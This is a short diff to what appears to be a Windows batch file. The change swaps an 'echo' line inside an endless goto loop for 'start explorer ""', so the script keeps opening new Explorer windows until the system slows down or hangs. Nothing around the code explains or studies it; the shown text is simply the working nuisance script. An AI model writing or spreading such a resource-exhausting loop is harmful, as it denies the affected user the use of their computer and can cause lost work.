@@ -3,5 +3,5 @@ color 0A
 goto :loop
 
 :loop
-echo tes
+start explorer  ""
 goto :loop
